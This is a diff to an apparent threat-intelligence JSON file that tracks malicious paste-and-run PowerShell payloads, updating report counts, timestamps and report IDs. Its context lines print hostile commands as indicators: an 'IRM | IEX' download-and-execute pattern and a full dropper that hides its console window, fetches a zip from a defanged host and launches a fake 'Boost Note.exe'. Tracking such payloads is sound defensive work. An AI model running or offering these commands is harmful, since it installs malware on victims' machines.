@@ -741,9 +741,9 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 10,
-    "ReportCount": 117,
+    "ReportCount": 118,
     "FirstSeen": "2026-11-11T09:34:52.390000+00:00",
-    "LastSeen": "2026-11-18T05:57:31.685000+00:00",
+    "LastSeen": "2026-11-18T09:16:33.273000+00:00",
     "ReportIds": [
       "cmwbxak0c01mz0oml7ttj48xr",
       "cmwbxasem01nn0oml8ucnkogz",
@@ -861,7 +861,8 @@
       "cmwlenmwv1ies0omlx1cn7azg",
       "cmwlih2x41jki0oml386cqt7o",
       "cmwloa8db1nxt0omlu5xtc2ms",
-      "cmwlpm0d71qfe0oml8871qi6j"
+      "cmwlpm0d71qfe0oml8871qi6j",
+      "cmwlwpykb1qs60omlzij10hkx"
     ],
     "PayloadExamples": [
       "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
@@ -897,9 +898,9 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 43,
+    "ReportCount": 44,
     "FirstSeen": "2026-11-11T09:32:40.999000+00:00",
-    "LastSeen": "2026-11-18T06:31:00.718000+00:00",
+    "LastSeen": "2026-11-18T09:16:54.909000+00:00",
     "ReportIds": [
       "cmwbx7qrb01fb0oml2d3g5v8b",
       "cmwcf8b7j07s00omljo01l4y5",
@@ -943,7 +944,8 @@
       "cmwkdyqkq1ejj0omlch1vgqva",
       "cmwkjaxor1erj0omlu3i5ekvr",
       "cmwlny3101nfu0omlp5zxyi3o",
-      "cmwlqt2lp1qjq0omlqi37wlx9"
+      "cmwlqt2lp1qjq0omlqi37wlx9",
+      "cmwlwqf991qtd0omluedqwsp1"
     ],
     "PayloadExamples": [
       "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
